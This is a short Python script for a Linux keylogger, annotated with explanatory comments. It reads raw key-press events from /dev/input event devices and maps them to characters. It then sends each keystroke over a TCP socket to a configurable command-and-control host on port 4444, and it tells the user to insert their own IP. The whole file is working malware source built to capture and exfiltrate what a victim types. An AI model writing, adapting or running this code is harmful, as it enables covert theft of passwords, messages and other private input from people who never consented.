#!/usr/bin/env python3
import socket
import os
import struct
#convert between Python values and packed C structs (used to parse binary event data).
import time

# CHANGE THIS TO YOUR IP
C2_HOST = "192.168.1.0"  # Your actual IP address
C2_PORT = 4444

#destination c2 server ip and port where the client will try to connect and send keystrokes

def send_key(key):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((C2_HOST, C2_PORT))
        s.send(key.encode())
        s.close()
        return True
    except:
        return False
    # Tries to create a TCP socket,sets 2 sec time out, connect to the C2 server(remote host), send the key(as bytes), and close the socket.

def main():
    # Simple key mapping
    keys = {
        2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
        16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't', 21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p',
        30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g', 35: 'h', 36: 'j', 37: 'k', 38: 'l',
        44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b', 49: 'n', 50: 'm',
        57: ' ', 28: '[ENTER]\n', 14: '[BACKSPACE]', 15: '[TAB]', 1: '[ESC]'
    }
    
    # Find keyboard
    device = None
    for i in range(10):
        path = f"/dev/input/event{i}"
        if os.path.exists(path):
            device = path
            break
    #this searches for a file path like /dev/input/event0 to /dev/input/event9
    # the first one found is assumed to be the keyboard device file
    # that code opens the system device on linux that represents keyboard input events        
            
    if not device:
        print("[-] No keyboard found")
        return
    
    print(f"[+] Monitoring: {device}")
    print(f"[+] Sending to: {C2_HOST}:{C2_PORT}")
    
    fmt = "llHHI"
    size = struct.calcsize(fmt)

    #fmt is a format string used by struct.unpack() to decode binary data read from the device file. size computes how many bytes to read for each event record.

    try:
        with open(device, "rb") as fd:

            while True:
                data = fd.read(size)  # read one event record (size bytes)
                if not data: # nothing available right now
                    time.sleep(0.01)
                    continue
                
                _, _, type, code, value = struct.unpack(fmt, data)
                 # parse fields from the record
                
                # Key press only (not release)
                if type == 1 and value == 1:  # only handle key-press events (ignore releases)
                    key = keys.get(code, f'[KEY_{code}]') # convert numeric code → readable token
                    if send_key(key):  
                        print(f"[SENT] {repr(key)}") # send token to remote host
                    else:
                        print(f"[FAIL] {repr(key)}")

                    #this reads raw input events from the keyboard device file in an infinite loop.
                        
    except KeyboardInterrupt:
        print("\n[-] Stopped")
    except Exception as e:
        print(f"[!] Error: {e}")
# Read fixed-size binary events from the keyboard device and unpack them.
# If event is a key **press** (type==1 and value==1), map code→key and call send_key().
# Print [SENT] on success or [FAIL] on failure. Loop until interrupted.


if __name__ == "__main__":
    main()
